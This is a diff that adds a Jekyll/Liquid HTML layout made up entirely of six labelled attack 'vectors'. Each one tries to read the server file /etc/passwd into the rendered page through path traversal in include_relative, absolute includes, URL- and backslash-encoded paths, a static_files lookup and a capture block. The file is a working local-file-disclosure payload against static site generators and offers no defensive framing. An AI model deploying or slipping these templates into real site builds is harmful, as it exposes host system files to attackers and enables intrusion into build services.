@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head><title>{{ page.title }}</title></head>
+<body>
+<h1>{{ page.title }}</h1>
+<hr>
+
+<h2>Vector 1: include_relative with traversal</h2>
+<pre>{% include_relative ../../../etc/passwd %}</pre>
+
+<h2>Vector 2: absolute include</h2>
+<pre>{% include /etc/passwd %}</pre>
+
+<h2>Vector 3: include_relative with url encoding</h2>
+<pre>{% include_relative ..%2F..%2F..%2Fetc%2Fpasswd %}</pre>
+
+<h2>Vector 4: include_relative double dot</h2>
+<pre>{% include_relative ..%5C..%5C..%5Cetc%5Cpasswd %}</pre>
+
+<h2>Vector 5: Liquid file read attempt</h2>
+{% assign file_content = site.static_files | where: "path", "/etc/passwd" %}
+<pre>{{ file_content | inspect }}</pre>
+
+<h2>Vector 6: Capture with include</h2>
+{% capture passwd %}{% include /etc/passwd %}{% endcapture %}
+<pre>{{ passwd }}</pre>
+
+<hr>
+{{ content }}
+</body>
+</html>
